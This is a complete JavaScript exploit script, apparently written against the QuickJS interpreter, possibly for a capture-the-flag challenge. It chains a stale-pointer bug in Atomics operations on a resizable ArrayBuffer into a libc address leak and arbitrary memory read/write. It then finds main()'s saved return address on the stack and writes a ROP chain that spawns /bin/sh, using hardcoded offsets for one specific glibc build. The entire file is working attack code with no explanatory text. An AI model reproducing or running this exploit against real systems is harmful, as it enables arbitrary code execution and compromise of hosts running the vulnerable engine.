// exec-shell-cfi exploit using Atomics+ResizableArrayBuffer stale pointer bug
// Strategy: libc leak (unsorted fd) -> corrupt typed array data pointer for arbitrary RW
//           -> stack scan for main() return address -> ROP -> execve("/bin/sh")

function chunkSize(req) {
  let sz = req + 0x10;
  sz = (sz + 0xf) & ~0xf;
  if (sz < 0x20) sz = 0x20;
  return sz;
}

// Offsets for Debian GLIBC 2.41-12 (/usr/lib/x86_64-linux-gnu/libc.so.6)
const OFF_MAINARENA_FD = 0x1e7b20n;
const OFF_ENVIRON      = 0x1eee28n;
const OFF_MAIN_RETADDR = 0x29ca8n;

const OFF_RET          = 0x2846bn;
const OFF_POP_RDI      = 0x2a145n;
const OFF_POP_RSI      = 0x2baa9n;
const OFF_POP_RDX_RBX  = 0x8f0c5n;

const OFF_EXECVE       = 0xdddd0n;
const OFF_BINSH        = 0x1a7ea4n;

let _drain = [];
function drain_tcache_0x60(n) {
  // Allocate JSObjects (malloc(72) => chunk 0x60) and keep them alive.
  for (let i = 0; i < n; i++) {
    _drain.push({ x: _drain.length });
  }
}

function leak_libc_ptr() {
  const OLD = 0x5000;
  const NEW = 0x100;
  const NEW_CHUNK = chunkSize(NEW); // 0x110

  let ab = new ArrayBuffer(OLD, { maxByteLength: OLD });
  let ta = new BigInt64Array(ab);

  let idx = NEW_CHUNK / 8;
  let mal = { valueOf() { ab.resize(NEW); return 0n; } };

  return Atomics.add(ta, idx, mal);
}

function make_rw_at(addr) {
  // Drain right before the overlap allocation.
  drain_tcache_0x60(0x200);

  const OLD = 0x5000;
  const NEW = 0x100;
  const NEW_CHUNK = chunkSize(NEW);
  const OFF_PTR_FIELD = 0x38; // JSObject.u.array.u.ptr

  let backing = new ArrayBuffer(0x40000);

  let ab = new ArrayBuffer(OLD, { maxByteLength: OLD });
  let ta = new BigInt64Array(ab);
  let victim;

  let idx = (NEW_CHUNK + OFF_PTR_FIELD) / 8;
  let mal = {
    valueOf() {
      ab.resize(NEW);
      victim = new BigUint64Array(backing);
      return addr;
    }
  };

  Atomics.store(ta, idx, mal);
  return victim;
}

function fatal(msg) {
  throw new Error(msg);
}

// -------------------- stage 1: libc base leak --------------------
drain_tcache_0x60(0x400);
let leak = leak_libc_ptr();
let libc_base = leak - OFF_MAINARENA_FD;

// -------------------- stage 2: stack leak via environ --------------------
let rw_env = make_rw_at(libc_base + OFF_ENVIRON);
let environ_ptr = rw_env[0];
if (environ_ptr === 0n)
  fatal('failed to read environ');

// -------------------- stage 3: locate main() saved RIP close to environ --------------------
let target_ret = libc_base + OFF_MAIN_RETADDR;

let scan_base = environ_ptr - 0x4000n; // main() saved RIP is ~0x100-0x200 below environ
let rw_stack = make_rw_at(scan_base);

let found = -1;
// scan from high to low to pick the highest occurrence (closest to environ)
for (let i = 0x800 - 1; i >= 0; i--) {
  if (rw_stack[i] === target_ret) {
    found = i;
    break;
  }
}
if (found < 0)
  fatal('failed to locate saved RIP');

let ret_slot = scan_base + 8n * BigInt(found);

// -------------------- stage 4: ROP chain to execve("/bin/sh", ["/bin/sh",0], environ) --------------------
let ret_gadget    = libc_base + OFF_RET;
let pop_rdi       = libc_base + OFF_POP_RDI;
let pop_rsi       = libc_base + OFF_POP_RSI;
let pop_rdx_poprbx= libc_base + OFF_POP_RDX_RBX;
let execve        = libc_base + OFF_EXECVE;
let binsh         = libc_base + OFF_BINSH;

let argv_addr = ret_slot + 8n * 9n;

rw_stack[found + 0]  = ret_gadget;
rw_stack[found + 1]  = pop_rdi;
rw_stack[found + 2]  = binsh;
rw_stack[found + 3]  = pop_rsi;
rw_stack[found + 4]  = argv_addr;
rw_stack[found + 5]  = pop_rdx_poprbx;
rw_stack[found + 6]  = environ_ptr;
rw_stack[found + 7]  = 0n;
rw_stack[found + 8]  = execve;
rw_stack[found + 9]  = binsh;
rw_stack[found + 10] = 0n;

// Return from script; when qjs exits, main() returns into our chain.
